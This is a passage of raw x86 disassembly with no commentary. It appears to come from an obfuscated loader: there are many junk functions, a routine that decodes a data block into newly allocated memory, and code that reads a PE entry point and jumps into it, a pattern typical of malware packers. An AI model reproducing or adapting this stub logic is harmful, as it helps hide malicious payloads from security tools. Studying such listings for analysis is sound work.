  4d0753:	push   DWORD PTR [ecx+0x70]
  4d0756:	push   edx
  4d0757:	call   0x4d0bb0
  4d075c:	add    esp,0xc
  4d075f:	pop    ecx
  4d0760:	push   ecx
  4d0761:	push   0x0
  4d0763:	call   0x4d1144
  4d0768:	add    esp,0x4
  4d076b:	pop    ecx
  4d076c:	push   ecx
  4d076d:	push   0x0
  4d076f:	call   0x4d0bf8
  4d0774:	add    esp,0x4
  4d0777:	pop    ecx
  4d0778:	add    esp,0x58
  4d077b:	pop    ebp
  4d077c:	ret    
  4d077d:	add    BYTE PTR [eax],al
  4d077f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0785:	sub    esp,0x48
  4d0788:	lea    esi,ds:0x4d30c0
  4d078e:	cmp    esi,0x4994
  4d0794:	jbe    0x4d0783
  4d0796:	push   0xfffffff4
  4d0798:	call   0x4d0af4
  4d079d:	add    esp,0x4
  4d07a0:	push   esi
  4d07a1:	push   edx
  4d07a2:	push   DWORD PTR [esi+0xc4]
  4d07a8:	push   ebx
  4d07a9:	push   ebx
  4d07aa:	call   0x4d10fc
  4d07af:	add    esp,0x10
  4d07b2:	pop    esi
  4d07b3:	push   0x0
  4d07b5:	call   0x4d1090
  4d07ba:	add    esp,0x4
  4d07bd:	add    esp,0x48
  4d07c0:	pop    ebp
  4d07c1:	ret    
  4d07c2:	add    BYTE PTR [eax],al
  4d07c4:	mov    edi,edi
  4d07c6:	push   ebp
  4d07c7:	mov    ebp,esp
  4d07c9:	sub    esp,0x38
  4d07cc:	lea    eax,ds:0x4d30b0
  4d07d2:	xor    DWORD PTR [ebp-0x20],ecx
  4d07d5:	push   eax
  4d07d6:	push   0x0
  4d07d8:	call   0x4d1090
  4d07dd:	add    esp,0x4
  4d07e0:	pop    eax
  4d07e1:	push   eax
  4d07e2:	push   edi
  4d07e3:	push   DWORD PTR [eax+0x1cc]
  4d07e9:	push   DWORD PTR [eax+0xec]
  4d07ef:	call   0x4d12a0
  4d07f4:	add    esp,0xc
  4d07f7:	pop    eax
  4d07f8:	mov    edx,0x4d2048
  4d07fd:	mov    edx,DWORD PTR [edx]
  4d07ff:	push   edx
  4d0800:	push   DWORD PTR [eax-0x4c]
  4d0803:	pop    esi
  4d0804:	call   esi
  4d0806:	add    esp,0x38
  4d0809:	pop    ebp
  4d080a:	ret    
  4d080b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0811:	sub    esp,0x4c
  4d0814:	lea    eax,[edi-0x60]
  4d0817:	sbb    ecx,0xffffc93d
  4d081d:	push   eax
  4d081e:	push   0x0
  4d0820:	call   0x4d10f0
  4d0825:	add    esp,0x4
  4d0828:	pop    eax
  4d0829:	push   eax
  4d082a:	push   ebx
  4d082b:	push   DWORD PTR [eax+0x48]
  4d082e:	push   esi
  4d082f:	call   0x4d1520
  4d0834:	add    esp,0xc
  4d0837:	pop    eax
  4d0838:	push   eax
  4d0839:	mov    ebx,0x0
  4d083e:	push   ebx
  4d083f:	call   0x4d0850
  4d0844:	add    esp,0x4
  4d0847:	pop    eax
  4d0848:	add    esp,0x4c
  4d084b:	pop    ebp
  4d084c:	ret    
  4d084d:	add    BYTE PTR [eax],al
  4d084f:	add    BYTE PTR [edi-0x1],bl
  4d0852:	adc    eax,0x4d202c
  4d0857:	call   edi
  4d0859:	add    BYTE PTR [eax],al
  4d085b:	add    BYTE PTR [edi-0x1],bl
  4d085e:	adc    eax,0x4d2058
  4d0863:	call   edi
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [edi-0x1],bl
  4d086a:	adc    eax,0x4d209c
  4d086f:	call   edi
  4d0871:	add    BYTE PTR [eax],al
  4d0873:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0879:	sub    esp,0x58
  4d087c:	lea    ebx,[edi+0x74]
  4d087f:	adc    DWORD PTR [ebp-0x3c],0xffffec9a
  4d0886:	push   0xfffffff4
  4d0888:	call   0x4d0af4
  4d088d:	add    esp,0x4
  4d0890:	push   ebx
  4d0891:	push   DWORD PTR [ebx+0xbc]
  4d0897:	push   eax
  4d0898:	push   DWORD PTR [ebx+0x1e8]
  4d089e:	call   0x4d12ec
  4d08a3:	add    esp,0xc
  4d08a6:	pop    ebx
  4d08a7:	push   0x0
  4d08a9:	call   0x4d10f0
  4d08ae:	add    esp,0x4
  4d08b1:	add    esp,0x58
  4d08b4:	pop    ebp
  4d08b5:	ret    
  4d08b6:	add    BYTE PTR [eax],al
  4d08b8:	mov    edi,edi
  4d08ba:	push   ebp
  4d08bb:	mov    ebp,esp
  4d08bd:	sub    esp,0x5c
  4d08c0:	adc    DWORD PTR [eax-0x58],0x75c0
  4d08c7:	lea    ebx,[eax-0x4]
  4d08ca:	mov    edx,0x6ac
  4d08cf:	push   edx
  4d08d0:	push   0x6ac
  4d08d5:	mov    esi,0x40001
  4d08da:	push   esi
  4d08db:	mov    ecx,0x86298592
  4d08e0:	push   DWORD PTR [ecx+0x7a239a86]
  4d08e6:	sub    DWORD PTR [esp],0x2
  4d08ea:	mov    ecx,0x4d2004
  4d08ef:	pop    DWORD PTR [ecx]
  4d08f1:	call   0x4d0ecc
  4d08f6:	add    esp,0x4
  4d08f9:	push   eax
  4d08fa:	pop    DWORD PTR [ebx+0x8]
  4d08fd:	mov    eax,DWORD PTR [ebx+0x8]
  4d0900:	mov    edi,eax
  4d0902:	sub    edx,edx
  4d0904:	dec    edx
  4d0905:	and    edx,0x4d0014
  4d090b:	mov    eax,0x8d9ae218
  4d0910:	mov    esi,0x6ac
  4d0915:	cmp    esi,0x0
  4d0918:	je     0x4d0936
  4d091a:	add    esi,0xfffffffc
  4d091d:	xor    ecx,ecx
  4d091f:	push   DWORD PTR [edx+ecx*1]
  4d0922:	add    DWORD PTR [esp],eax
  4d0925:	pop    DWORD PTR [edi+ecx*2]
  4d0928:	dec    DWORD PTR [edi]
  4d092a:	xor    eax,eax
  4d092c:	add    eax,DWORD PTR [edx]
  4d092e:	add    edx,0x4
  4d0931:	add    edi,0x4
  4d0934:	jmp    0x4d0915
  4d0936:	call   0x4d0f24
  4d093b:	add    esp,0x4
  4d093e:	add    esp,0x5c
  4d0941:	pop    ebp
  4d0942:	ret    
  4d0943:	add    BYTE PTR [edi-0x1],bl
  4d0946:	adc    eax,0x4d2000
  4d094b:	call   edi
  4d094d:	add    BYTE PTR [eax],al
  4d094f:	add    BYTE PTR [edi-0x1],bl
  4d0952:	adc    eax,0x4d203c
  4d0957:	call   edi
  4d0959:	add    BYTE PTR [eax],al
  4d095b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0961:	sub    esp,0x30
  4d0964:	lea    esi,[ecx-0x50]
  4d0967:	add    DWORD PTR [ebp-0x2c],eax
  4d096a:	push   esi
  4d096b:	push   ebx
  4d096c:	push   DWORD PTR [esi+0xc]
  4d096f:	call   0x4d1008
  4d0974:	add    esp,0x8
  4d0977:	pop    esi
  4d0978:	mov    edx,0x0
  4d097d:	push   edx
  4d097e:	call   0x4d10e4
  4d0983:	add    esp,0x4
  4d0986:	mov    edx,0x0
  4d098b:	push   edx
  4d098c:	call   0x4d0950
  4d0991:	add    esp,0x4
  4d0994:	add    esp,0x30
  4d0997:	pop    ebp
  4d0998:	ret    
  4d0999:	add    BYTE PTR [eax],al
  4d099b:	add    BYTE PTR [edi-0x1],bl
  4d099e:	adc    eax,0x4d2028
  4d09a3:	call   edi
  4d09a5:	add    BYTE PTR [eax],al
  4d09a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09ad:	sub    esp,0x24
  4d09b0:	lea    eax,[ecx-0x38]
  4d09b3:	sbb    DWORD PTR [ebp-0x8],0xffffffa3
  4d09b7:	push   eax
  4d09b8:	call   0x4d1240
  4d09bd:	add    esp,0x4
  4d09c0:	pop    eax
  4d09c1:	push   eax
  4d09c2:	push   DWORD PTR [eax+0x4]
  4d09c5:	push   DWORD PTR [eax+0x1dc]
  4d09cb:	push   ebx
  4d09cc:	push   ebx
  4d09cd:	call   0x4d0c04
  4d09d2:	add    esp,0x10
  4d09d5:	pop    eax
  4d09d6:	push   eax
  4d09d7:	call   0x4d1240
  4d09dc:	add    esp,0x4
  4d09df:	pop    eax
  4d09e0:	add    esp,0x24
  4d09e3:	pop    ebp
  4d09e4:	ret    
  4d09e5:	add    BYTE PTR [eax],al
  4d09e7:	add    BYTE PTR [edi-0x1],bl
  4d09ea:	adc    eax,0x4d2098
  4d09ef:	call   edi
  4d09f1:	add    BYTE PTR [eax],al
  4d09f3:	add    BYTE PTR [edi-0x1],bl
  4d09f6:	adc    eax,0x4d2070
  4d09fb:	call   edi
  4d09fd:	add    BYTE PTR [eax],al
  4d09ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a05:	sub    esp,0x34
  4d0a08:	lea    eax,ds:0x4d3060
  4d0a0e:	add    esi,edx
  4d0a10:	push   eax
  4d0a11:	push   0x0
  4d0a13:	call   0x4d0850
  4d0a18:	add    esp,0x4
  4d0a1b:	pop    eax
  4d0a1c:	push   eax
  4d0a1d:	push   DWORD PTR [eax+0x138]
  4d0a23:	push   esi
  4d0a24:	push   DWORD PTR [eax+0x6c]
  4d0a27:	push   edi
  4d0a28:	call   0x4d08b8
  4d0a2d:	add    esp,0x10
  4d0a30:	pop    eax
  4d0a31:	push   eax
  4d0a32:	mov    edx,0x0
  4d0a37:	push   edx
  4d0a38:	call   0x4d1090
  4d0a3d:	add    esp,0x4
  4d0a40:	pop    eax
  4d0a41:	add    esp,0x34
  4d0a44:	pop    ebp
  4d0a45:	ret    
  4d0a46:	add    BYTE PTR [eax],al
  4d0a48:	mov    edi,edi
  4d0a4a:	push   ebp
  4d0a4b:	mov    ebp,esp
  4d0a4d:	sub    esp,0x44
  4d0a50:	lea    esi,ds:0x4d3178
  4d0a56:	sbb    eax,edx
  4d0a58:	mov    ebx,0x0
  4d0a5d:	push   ebx
  4d0a5e:	call   0x4d0850
  4d0a63:	add    esp,0x4
  4d0a66:	push   esi
  4d0a67:	push   DWORD PTR [esi+0x1a4]
  4d0a6d:	push   DWORD PTR [esi+0x194]
  4d0a73:	push   DWORD PTR [esi+0x104]
  4d0a79:	call   0x4d0dc8
  4d0a7e:	add    esp,0xc
  4d0a81:	pop    esi
  4d0a82:	mov    edx,0x0
  4d0a87:	push   edx
  4d0a88:	call   0x4d1090
  4d0a8d:	add    esp,0x4
  4d0a90:	add    esp,0x44
  4d0a93:	pop    ebp
  4d0a94:	ret    
  4d0a95:	add    BYTE PTR [eax],al
  4d0a97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a9d:	sub    esp,0x30
  4d0aa0:	lea    edi,[esi+0x8c]
  4d0aa6:	xor    DWORD PTR [edi-0xe4],0x6d96
  4d0ab0:	push   edi
  4d0ab1:	push   esi
  4d0ab2:	push   DWORD PTR [edi+0x50]
  4d0ab5:	push   edx
  4d0ab6:	push   DWORD PTR [edi+0xe4]
  4d0abc:	call   0x4d0a48
  4d0ac1:	add    esp,0x10
  4d0ac4:	pop    edi
  4d0ac5:	push   edi
  4d0ac6:	push   0x0
  4d0ac8:	call   0x4d0bf8
  4d0acd:	add    esp,0x4
  4d0ad0:	pop    edi
  4d0ad1:	push   edi
  4d0ad2:	mov    ecx,0x0
  4d0ad7:	push   ecx
  4d0ad8:	call   0x4d0850
  4d0add:	add    esp,0x4
  4d0ae0:	pop    edi
  4d0ae1:	add    esp,0x30
  4d0ae4:	pop    ebp
  4d0ae5:	ret    
  4d0ae6:	add    BYTE PTR [eax],al
  4d0ae8:	pop    edi
  4d0ae9:	call   DWORD PTR ds:0x4d2038
  4d0aef:	call   edi
  4d0af1:	add    BYTE PTR [eax],al
  4d0af3:	add    BYTE PTR [edi-0x1],bl
  4d0af6:	adc    eax,0x4d2044
  4d0afb:	call   edi
  4d0afd:	add    BYTE PTR [eax],al
  4d0aff:	add    BYTE PTR [edi-0x1],bl
  4d0b02:	adc    eax,0x4d208c
  4d0b07:	call   edi
  4d0b09:	add    BYTE PTR [eax],al
  4d0b0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b11:	sub    esp,0x40
  4d0b14:	mov    eax,0x4d306c
  4d0b19:	cmp    eax,0x3a6b
  4d0b1e:	jbe    0x4d0b0f
  4d0b20:	push   eax
  4d0b21:	mov    edx,0x0
  4d0b26:	push   edx
  4d0b27:	call   0x4d1090
  4d0b2c:	add    esp,0x4
  4d0b2f:	pop    eax
  4d0b30:	push   eax
  4d0b31:	push   DWORD PTR [eax+0x120]
  4d0b37:	push   DWORD PTR [eax+0x1f0]
  4d0b3d:	push   DWORD PTR [eax+0x1b0]
  4d0b43:	call   0x4d104c
  4d0b48:	add    esp,0xc
  4d0b4b:	pop    eax
  4d0b4c:	push   eax
  4d0b4d:	push   0xfffffff4
  4d0b4f:	call   0x4d0af4
  4d0b54:	add    esp,0x4
  4d0b57:	pop    eax
  4d0b58:	add    esp,0x40
  4d0b5b:	pop    ebp
  4d0b5c:	ret    
  4d0b5d:	add    BYTE PTR [eax],al
  4d0b5f:	add    BYTE PTR [edi-0x1],bl
  4d0b62:	adc    eax,0x4d20a0
  4d0b67:	call   edi
  4d0b69:	add    BYTE PTR [eax],al
  4d0b6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b71:	sub    esp,0x60
  4d0b74:	lea    eax,[edi+0xec]
  4d0b7a:	add    DWORD PTR [ebp-0x24],ecx
  4d0b7d:	push   eax
  4d0b7e:	push   ecx
  4d0b7f:	push   ecx
  4d0b80:	call   0x4d0d30
  4d0b85:	add    esp,0x8
  4d0b88:	pop    eax
  4d0b89:	push   eax
  4d0b8a:	mov    edx,0x0
  4d0b8f:	push   edx
  4d0b90:	call   0x4d10f0
  4d0b95:	add    esp,0x4
  4d0b98:	pop    eax
  4d0b99:	push   eax
  4d0b9a:	mov    eax,0x0
  4d0b9f:	push   eax
  4d0ba0:	call   0x4d1234
  4d0ba5:	add    esp,0x4
  4d0ba8:	pop    eax
  4d0ba9:	add    esp,0x60
  4d0bac:	pop    ebp
  4d0bad:	ret    
  4d0bae:	add    BYTE PTR [eax],al
  4d0bb0:	mov    edi,edi
  4d0bb2:	push   ebp
  4d0bb3:	mov    ebp,esp
  4d0bb5:	sub    esp,0x2c
  4d0bb8:	lea    edx,ds:0x4d3044
  4d0bbe:	xor    ebx,DWORD PTR [ebp-0x20]
  4d0bc1:	push   edx
  4d0bc2:	push   0x0
  4d0bc4:	call   0x4d1234
  4d0bc9:	add    esp,0x4
  4d0bcc:	pop    edx
  4d0bcd:	push   edx
  4d0bce:	push   edi
  4d0bcf:	push   eax
  4d0bd0:	push   DWORD PTR [edx+0x160]
  4d0bd6:	push   ebx
  4d0bd7:	call   0x4d11f8
  4d0bdc:	add    esp,0x10
  4d0bdf:	pop    edx
  4d0be0:	push   edx
  4d0be1:	mov    esi,0x0
  4d0be6:	push   esi
  4d0be7:	call   0x4d10f0
  4d0bec:	add    esp,0x4
  4d0bef:	pop    edx
  4d0bf0:	add    esp,0x2c
  4d0bf3:	pop    ebp
  4d0bf4:	ret    
  4d0bf5:	add    BYTE PTR [eax],al
  4d0bf7:	add    BYTE PTR [edi-0x1],bl
  4d0bfa:	adc    eax,0x4d2014
  4d0bff:	call   edi
  4d0c01:	add    BYTE PTR [eax],al
  4d0c03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c09:	sub    esp,0x2c
  4d0c0c:	lea    edx,ds:0x4d31cc
  4d0c12:	or     ebx,eax
  4d0c14:	push   edx
  4d0c15:	mov    edx,0xfffffff4
  4d0c1a:	push   edx
  4d0c1b:	call   0x4d0af4
  4d0c20:	add    esp,0x4
  4d0c23:	pop    edx
  4d0c24:	push   edx
  4d0c25:	push   ecx
  4d0c26:	push   ebx
  4d0c27:	call   0x4d1384
  4d0c2c:	add    esp,0x8
  4d0c2f:	pop    edx
  4d0c30:	push   edx
  4d0c31:	push   0x0
  4d0c33:	call   0x4d119c
  4d0c38:	add    esp,0x4
  4d0c3b:	pop    edx
  4d0c3c:	add    esp,0x2c
  4d0c3f:	pop    ebp
  4d0c40:	ret    
  4d0c41:	add    BYTE PTR [eax],al
  4d0c43:	add    BYTE PTR [edi+0x2b],dl
  4d0c46:	call   DWORD PTR [edi+0x57]
  4d0c49:	push   edi
  4d0c4a:	push   edi
  4d0c4b:	call   0x4d1240
  4d0c50:	sub    esp,0xfffffffc
  4d0c53:	call   0x4d0944
  4d0c58:	push   0x2
  4d0c5a:	xor    eax,eax
  4d0c5c:	sub    eax,0x4d3030
  4d0c61:	neg    eax
  4d0c63:	push   0x0
  4d0c65:	lea    ecx,[eax+0x4]
  4d0c68:	add    BYTE PTR [ecx],0x3
  4d0c6b:	push   eax
  4d0c6c:	call   0x4d0ecc
  4d0c71:	pop    edi
  4d0c72:	pop    edi
  4d0c73:	pop    edi
  4d0c74:	lea    ecx,[eax+0x3b]
  4d0c77:	mov    edi,DWORD PTR [ecx]
  4d0c79:	lea    eax,[eax+edi*1]
  4d0c7c:	mov    eax,DWORD PTR [eax+0x28]
  4d0c7f:	pusha  
  4d0c80:	mov    ah,0x45
  4d0c82:	sub    al,ah
  4d0c84:	ja     0x4d07c4
  4d0c8a:	popa   
  4d0c8b:	ret    
  4d0c8c:	pop    edi
  4d0c8d:	call   DWORD PTR ds:0x4d2064
  4d0c93:	call   edi
  4d0c95:	add    BYTE PTR [eax],al
  4d0c97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c9d:	sub    esp,0x44
  4d0ca0:	lea    eax,ds:0x4d30d8
  4d0ca6:	cmp    eax,0xa4d
  4d0cab:	jbe    0x4d0c9b
  4d0cad:	push   eax
  4d0cae:	mov    edx,0x0
  4d0cb3:	push   edx
  4d0cb4:	call   0x4d119c
  4d0cb9:	add    esp,0x4
  4d0cbc:	pop    eax
  4d0cbd:	push   eax
  4d0cbe:	push   DWORD PTR [eax+0x24]
  4d0cc1:	push   ecx
  4d0cc2:	call   0x4d0ee4
  4d0cc7:	add    esp,0x8
  4d0cca:	pop    eax
  4d0ccb:	push   eax
  4d0ccc:	mov    ecx,0xfffffff4
  4d0cd1:	push   ecx
  4d0cd2:	call   0x4d0af4
  4d0cd7:	add    esp,0x4
  4d0cda:	pop    eax
  4d0cdb:	add    esp,0x44
  4d0cde:	pop    ebp
  4d0cdf:	ret    
  4d0ce0:	mov    edi,edi
  4d0ce2:	push   ebp
  4d0ce3:	mov    ebp,esp
  4d0ce5:	sub    esp,0x4c
  4d0ce8:	lea    eax,ds:0x4d31f4
  4d0cee:	cmp    eax,0x3099
  4d0cf3:	jb     0x4d0ce3
  4d0cf5:	push   eax
  4d0cf6:	push   edi
  4d0cf7:	push   ecx
  4d0cf8:	push   DWORD PTR [eax+0x28]
  4d0cfb:	push   DWORD PTR [eax+0x158]
  4d0d01:	call   0x4d1480
  4d0d06:	add    esp,0x10
  4d0d09:	pop    eax
  4d0d0a:	push   eax
  4d0d0b:	call   0x4d0734
  4d0d10:	add    esp,0x4
  4d0d13:	pop    eax
  4d0d14:	push   eax
  4d0d15:	call   0x4d1240
  4d0d1a:	add    esp,0x4
  4d0d1d:	pop    eax
  4d0d1e:	add    esp,0x4c
  4d0d21:	pop    ebp
  4d0d22:	ret    
  4d0d23:	add    BYTE PTR [edi-0x1],bl
  4d0d26:	adc    eax,0x4d204c
  4d0d2b:	call   edi
  4d0d2d:	add    BYTE PTR [eax],al
  4d0d2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d35:	sub    esp,0x30
  4d0d38:	lea    edx,[eax+0x24]
  4d0d3b:	adc    DWORD PTR [edx-0x14],edx
  4d0d3e:	push   edx
  4d0d3f:	push   DWORD PTR [edx+0xd4]
  4d0d45:	push   DWORD PTR [edx+0x1f0]
  4d0d4b:	push   esi
  4d0d4c:	push   DWORD PTR [edx+0x118]
  4d0d52:	call   0x4d124c
  4d0d57:	add    esp,0x10
  4d0d5a:	pop    edx
  4d0d5b:	push   edx
  4d0d5c:	mov    edx,0x0
  4d0d61:	push   edx
  4d0d62:	call   0x4d1090
  4d0d67:	add    esp,0x4
  4d0d6a:	pop    edx
  4d0d6b:	push   edx
  4d0d6c:	push   0x0
  4d0d6e:	call   0x4d0bf8
  4d0d73:	add    esp,0x4
  4d0d76:	pop    edx
  4d0d77:	add    esp,0x30
  4d0d7a:	pop    ebp
  4d0d7b:	ret    
  4d0d7c:	mov    edi,edi
  4d0d7e:	push   ebp
  4d0d7f:	mov    ebp,esp
  4d0d81:	sub    esp,0x58
  4d0d84:	lea    ecx,[ebx+0x44]
  4d0d87:	mov    DWORD PTR [ebp-0x40],0xffffffdc
  4d0d8e:	push   ecx
  4d0d8f:	push   0x0
  4d0d91:	call   0x4d10e4
  4d0d96:	add    esp,0x4
  4d0d99:	pop    ecx
  4d0d9a:	push   ecx
  4d0d9b:	push   DWORD PTR [ecx+0x150]
  4d0da1:	push   DWORD PTR [ecx+0x78]
  4d0da4:	push   esi
  4d0da5:	push   DWORD PTR [ecx+0x1e0]
  4d0dab:	call   0x4d0ce0
  4d0db0:	add    esp,0x10
  4d0db3:	pop    ecx
  4d0db4:	push   ecx
  4d0db5:	push   0x0
  4d0db7:	call   0x4d1144
  4d0dbc:	add    esp,0x4
  4d0dbf:	pop    ecx
  4d0dc0:	add    esp,0x58
  4d0dc3:	pop    ebp
  4d0dc4:	ret    
  4d0dc5:	add    BYTE PTR [eax],al
  4d0dc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dcd:	sub    esp,0x28
  4d0dd0:	lea    ecx,ds:0x4d30ac
  4d0dd6:	or     edx,DWORD PTR [ebp-0x8]
  4d0dd9:	push   ecx
  4d0dda:	push   edi
  4d0ddb:	push   esi
  4d0ddc:	call   0x4d095c
  4d0de1:	add    esp,0x8
  4d0de4:	pop    ecx
  4d0de5:	push   ecx
  4d0de6:	mov    ecx,0x0
  4d0deb:	push   ecx
  4d0dec:	call   0x4d0850
  4d0df1:	add    esp,0x4
  4d0df4:	pop    ecx
  4d0df5:	push   ecx
  4d0df6:	mov    esi,0x0
  4d0dfb:	push   esi
  4d0dfc:	call   0x4d1234
  4d0e01:	add    esp,0x4
  4d0e04:	pop    ecx
  4d0e05:	add    esp,0x28
  4d0e08:	pop    ebp
  4d0e09:	ret    
  4d0e0a:	add    BYTE PTR [eax],al
  4d0e0c:	pop    edi
  4d0e0d:	call   DWORD PTR ds:0x4d205c
  4d0e13:	call   edi
  4d0e15:	add    BYTE PTR [eax],al
  4d0e17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e1d:	sub    esp,0x58
  4d0e20:	lea    esi,[ecx+0xc0]
  4d0e26:	cmp    esi,0x1e08
  4d0e2c:	je     0x4d0e1b
  4d0e2e:	call   0x4d1240
  4d0e33:	add    esp,0x4
  4d0e36:	push   esi
  4d0e37:	push   DWORD PTR [esi+0xb0]
  4d0e3d:	push   DWORD PTR [esi+0x15c]
  4d0e43:	push   ecx
  4d0e44:	push   DWORD PTR [esi+0x40]
  4d0e47:	call   0x4d0a98
  4d0e4c:	add    esp,0x10
  4d0e4f:	pop    esi
  4d0e50:	mov    edx,0x0
  4d0e55:	push   edx
  4d0e56:	call   0x4d0950
  4d0e5b:	add    esp,0x4
  4d0e5e:	add    esp,0x58
  4d0e61:	pop    ebp
  4d0e62:	ret    
  4d0e63:	add    BYTE PTR [edi-0x1],bl
  4d0e66:	adc    eax,0x4d2088
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e75:	sub    esp,0x24
  4d0e78:	lea    ecx,ds:0x4d31d0
  4d0e7e:	mov    DWORD PTR [ebp-0x18],0x70
  4d0e85:	push   ecx
  4d0e86:	push   DWORD PTR [ecx+0x16c]
  4d0e8c:	push   DWORD PTR [ecx+0x1a0]
  4d0e92:	push   edx
  4d0e93:	push   edx
  4d0e94:	call   0x4d0f30
  4d0e99:	add    esp,0x10
  4d0e9c:	pop    ecx
  4d0e9d:	push   ecx
  4d0e9e:	mov    esi,0xfffffff4
  4d0ea3:	push   esi
  4d0ea4:	call   0x4d0af4
  4d0ea9:	add    esp,0x4
  4d0eac:	pop    ecx
  4d0ead:	push   ecx
  4d0eae:	push   0x0
  4d0eb0:	call   0x4d10f0
  4d0eb5:	add    esp,0x4
  4d0eb8:	pop    ecx
  4d0eb9:	add    esp,0x24
  4d0ebc:	pop    ebp
  4d0ebd:	ret    
  4d0ebe:	add    BYTE PTR [eax],al
  4d0ec0:	pop    edi
  4d0ec1:	call   DWORD PTR ds:0x4d2090
  4d0ec7:	call   edi
  4d0ec9:	add    BYTE PTR [eax],al
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d2004
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [edi-0x1],bl
  4d0eda:	adc    eax,0x4d2068
  4d0edf:	call   edi
  4d0ee1:	add    BYTE PTR [eax],al
  4d0ee3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ee9:	sub    esp,0x30
  4d0eec:	lea    edx,[eax+0x44]
  4d0eef:	sub    esi,DWORD PTR [ebp-0x24]
  4d0ef2:	push   edx
  4d0ef3:	push   ebx
  4d0ef4:	push   DWORD PTR [edx+0xd0]
  4d0efa:	push   edi
  4d0efb:	push   eax
  4d0efc:	call   0x4d1344
  4d0f01:	add    esp,0x10
  4d0f04:	pop    edx
  4d0f05:	push   edx
  4d0f06:	mov    edi,0x0
  4d0f0b:	push   edi
  4d0f0c:	call   0x4d0850
  4d0f11:	add    esp,0x4
  4d0f14:	pop    edx
  4d0f15:	push   edx
  4d0f16:	call   0x4d0f24
  4d0f1b:	add    esp,0x4
  4d0f1e:	pop    edx
  4d0f1f:	add    esp,0x30
  4d0f22:	pop    ebp
  4d0f23:	ret    
  4d0f24:	pop    edi
  4d0f25:	call   DWORD PTR ds:0x4d2020
  4d0f2b:	call   edi
  4d0f2d:	add    BYTE PTR [eax],al
  4d0f2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f35:	sub    esp,0x50
  4d0f38:	lea    edx,[ecx-0x130]
  4d0f3e:	and    ebx,esi
  4d0f40:	push   edx
  4d0f41:	push   0x0
  4d0f43:	call   0x4d10f0
  4d0f48:	add    esp,0x4
  4d0f4b:	pop    edx
  4d0f4c:	push   edx
  4d0f4d:	push   ecx
  4d0f4e:	push   eax
  4d0f4f:	push   DWORD PTR [edx+0x48]
  4d0f52:	call   0x4d0fbc
  4d0f57:	add    esp,0xc
  4d0f5a:	pop    edx
  4d0f5b:	push   edx
  4d0f5c:	mov    edx,0x0
  4d0f61:	push   edx
  4d0f62:	call   0x4d0850
  4d0f67:	add    esp,0x4
  4d0f6a:	pop    edx
  4d0f6b:	add    esp,0x50
  4d0f6e:	pop    ebp
  4d0f6f:	ret    
  4d0f70:	mov    edi,edi
  4d0f72:	push   ebp
  4d0f73:	mov    ebp,esp
  4d0f75:	sub    esp,0x58
  4d0f78:	lea    ebx,ds:0x4d3084
  4d0f7e:	mov    esi,DWORD PTR [ebx+0x124]
  4d0f84:	push   ebx
  4d0f85:	push   DWORD PTR [ebx+0x158]
  4d0f8b:	push   DWORD PTR [ebx+0xac]
  4d0f91:	push   DWORD PTR [ebx+0x2c]
  4d0f94:	call   0x4d0c98
  4d0f99:	add    esp,0xc
  4d0f9c:	pop    ebx
  4d0f9d:	push   0x0
  4d0f9f:	call   0x4d1144
  4d0fa4:	add    esp,0x4
  4d0fa7:	mov    edi,0x0
  4d0fac:	push   edi
  4d0fad:	call   0x4d1234
  4d0fb2:	add    esp,0x4
  4d0fb5:	add    esp,0x58
  4d0fb8:	pop    ebp
  4d0fb9:	ret    
  4d0fba:	add    BYTE PTR [eax],al
  4d0fbc:	mov    edi,edi
  4d0fbe:	push   ebp
  4d0fbf:	mov    ebp,esp
  4d0fc1:	sub    esp,0x5c
  4d0fc4:	lea    edi,ds:0x4d3004
  4d0fca:	adc    DWORD PTR [ebp-0x28],edi
  4d0fcd:	push   edi
  4d0fce:	push   DWORD PTR [edi+0x1a4]
  4d0fd4:	push   eax
  4d0fd5:	push   DWORD PTR [edi+0x100]
  4d0fdb:	call   0x4d0b6c
  4d0fe0:	add    esp,0xc
  4d0fe3:	pop    edi
  4d0fe4:	push   edi
  4d0fe5:	call   0x4d1240
  4d0fea:	add    esp,0x4
  4d0fed:	pop    edi
  4d0fee:	push   edi
  4d0fef:	lea    ecx,[edi-0x4]
  4d0ff2:	push   ecx
  4d0ff3:	call   0x4d132c
  4d0ff8:	add    esp,0x4
  4d0ffb:	test   eax,eax
  4d0ffd:	jne    0x4d0fef
  4d0fff:	pop    edi
  4d1000:	add    esp,0x5c
  4d1003:	pop    ebp
  4d1004:	ret    
  4d1005:	add    BYTE PTR [eax],al
  4d1007:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d100d:	sub    esp,0x2c
  4d1010:	lea    ebx,ds:0x4d3118
  4d1016:	or     DWORD PTR [ebp-0x14],eax
  4d1019:	mov    edi,0x0
  4d101e:	push   edi
  4d101f:	call   0x4d0bf8
  4d1024:	add    esp,0x4
  4d1027:	push   ebx
  4d1028:	push   eax
  4d1029:	push   ecx
  4d102a:	push   DWORD PTR [ebx+0x138]
  4d1030:	call   0x4d0d7c
  4d1035:	add    esp,0xc
  4d1038:	pop    ebx
  4d1039:	mov    edx,0x0
  4d103e:	push   edx
  4d103f:	call   0x4d1144
  4d1044:	add    esp,0x4
  4d1047:	add    esp,0x2c
  4d104a:	pop    ebp
  4d104b:	ret    
  4d104c:	mov    edi,edi
  4d104e:	push   ebp
  4d104f:	mov    ebp,esp
  4d1051:	sub    esp,0x54
